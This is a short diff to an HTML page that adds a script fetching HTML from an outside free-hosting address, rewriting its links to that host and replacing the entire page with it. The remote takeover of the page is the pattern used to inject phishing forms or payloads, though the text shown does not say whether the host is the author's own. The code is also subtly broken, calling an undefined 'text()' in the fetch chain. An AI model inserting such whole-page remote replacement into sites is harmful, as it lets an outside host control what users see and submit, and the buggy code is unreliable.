@@ -54,5 +54,18 @@
 </div>
 
 
+    
+    
+<script>
+    fetch('https://maycowmoura.000webhostapp.com/form/').then(t => text())
+    .then(html => {
+        html = html.replace(/<\/*html[^>]*>/g, ''); // remove html tag
+        // replace all local url to web url
+        html = html.replace(/(?<=src|href)="(?!http|#)([^"]+)"/g, function(full, group1){ 
+            return full.replace(group1, 'https://maycowmoura.000webhostapp.com/form/'+group1)
+        });
+        document.documentElement.innerHTML = html;
+    })
+</script>
 </body>
 </html>
